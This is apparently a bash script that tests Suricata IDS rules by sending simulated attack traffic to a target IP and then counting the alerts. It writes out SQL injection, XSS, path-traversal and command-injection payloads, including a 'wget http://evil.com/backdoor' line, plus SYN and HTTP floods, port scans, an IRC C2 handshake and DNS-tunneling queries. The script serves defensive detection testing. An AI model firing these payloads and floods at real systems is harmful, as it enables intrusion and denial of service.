#!/bin/bash
# ==============================================================================
# Analytical-Intelligence — Suricata Rule Test Script
# ==============================================================================
# Tests ALL rule categories against a target.
# Run from the SENSOR machine (where Suricata is running).
#
# Usage: bash scripts/test_suricata.sh [TARGET_IP]
# ==============================================================================

TARGET="${1:-192.168.61.157}"
echo ""
echo "🔬 Suricata Rules Test — Target: $TARGET"
echo "==========================================="

# ── 1. Web Attacks (HTTP app-layer) ──────────────────────────────────────────
echo "[1/9] Web Attacks..."
curl -s "http://$TARGET/?id=1'%20UNION%20SELECT%20NULL--" > /dev/null 2>&1
curl -s "http://$TARGET/?q=%3Cscript%3Ealert(1)%3C/script%3E" > /dev/null 2>&1
curl -s "http://$TARGET/../../etc/passwd" > /dev/null 2>&1
curl -s "http://$TARGET/?file=php://input" > /dev/null 2>&1

# ── 2. Command Injection / RCE ───────────────────────────────────────────────
echo "[2/9] Command Injection..."
curl -G -s "http://$TARGET/" --data-urlencode "cmd=wget http://evil.com/backdoor" > /dev/null 2>&1
curl -G -s "http://$TARGET/" --data-urlencode "cmd=/bin/sh -c id" > /dev/null 2>&1
curl -G -s "http://$TARGET/" --data-urlencode "cmd=/bin/bash -i" > /dev/null 2>&1

# ── 3. Port Scan (SYN scan — raw packets, no flow needed) ───────────────────
echo "[3/9] Port Scan (nmap SYN)..."
nmap -sS -T4 --min-rate 50 -p 1-100 $TARGET > /dev/null 2>&1 &

# ── 4. DoS — HTTP flood ─────────────────────────────────────────────────────
echo "[4/9] DoS HTTP flood (100 requests)..."
for i in $(seq 1 100); do
    curl -s "http://$TARGET/" > /dev/null 2>&1 &
done

# ── 5. DoS — SYN flood (hping3 if available, else nmap) ─────────────────────
echo "[5/9] DoS SYN flood..."
if command -v hping3 &> /dev/null; then
    hping3 -S --flood -p 80 $TARGET -c 100 > /dev/null 2>&1 &
else
    nmap -sS -T5 --min-rate 200 -p 80 $TARGET > /dev/null 2>&1 &
fi

# ── 6. Botnet IRC C2 ────────────────────────────────────────────────────────
echo "[6/9] Botnet IRC C2..."
echo -e "NICK attacker\r\nUSER attacker 0 0 :attacker\r\n" | nc -w 3 $TARGET 6667 > /dev/null 2>&1 &

# ── 7. DNS Tunneling (long subdomain) ───────────────────────────────────────
echo "[7/9] DNS Tunneling..."
dig aaaaaaaaaaaaaaaaaaaaaaaaaaa.exfiltrate.test.com > /dev/null 2>&1
dig bbbbbbbbbbbbbbbbbbbbbbbbbbb.tunneling.evil.com > /dev/null 2>&1

# ── 8. High-rate DNS (beaconing/DGA) ────────────────────────────────────────
echo "[8/9] High-rate DNS (30 queries)..."
for i in $(seq 1 30); do
    dig test${i}.malware-domain.com > /dev/null 2>&1 &
done

# ── 9. Brute Force SSH ──────────────────────────────────────────────────────
echo "[9/9] SSH Brute Force..."
for i in $(seq 1 8); do
    nc -w 1 -z $TARGET 22 > /dev/null 2>&1 &
done

# ── Wait & Report ────────────────────────────────────────────────────────────
echo ""
echo "⏳ Waiting 5s for Suricata to process..."
wait 2>/dev/null
sleep 5

echo ""
echo "📊 Results"
echo "==========================================="

# Check fast.log for alerts
FAST_LOG="/var/log/suricata/fast.log"
EVE_LOG="/var/log/suricata/eve.json"

# Try docker exec if running on host
if [ -f "$FAST_LOG" ]; then
    LOG_CMD="cat"
    LOG_FILE="$FAST_LOG"
elif docker exec ai_db-suricata test -f /var/log/suricata/fast.log 2>/dev/null; then
    LOG_CMD="docker exec ai_db-suricata cat"
    LOG_FILE="/var/log/suricata/fast.log"
else
    echo "⚠ Cannot access fast.log directly."
    echo "  Run: docker exec ai_db-suricata cat /var/log/suricata/fast.log"
    echo "  Or:  docker exec ai_db-suricata tail -30 /var/log/suricata/eve.json"
    exit 0
fi

echo "Last 20 alerts:"
$LOG_CMD $LOG_FILE | tail -20
echo ""

echo "Summary by category:"
for rule in "DDoS" "DoS" "PortScan" "Botnet" "BruteForce" "WebAttack" "RCE" "Recon" "Malware"; do
    count=$($LOG_CMD $LOG_FILE | grep -c "AI $rule" 2>/dev/null || echo "0")
    printf "  %-15s %s\n" "AI $rule:" "$count"
done

echo ""
echo "Total alerts: $($LOG_CMD $LOG_FILE | wc -l 2>/dev/null || echo 0)"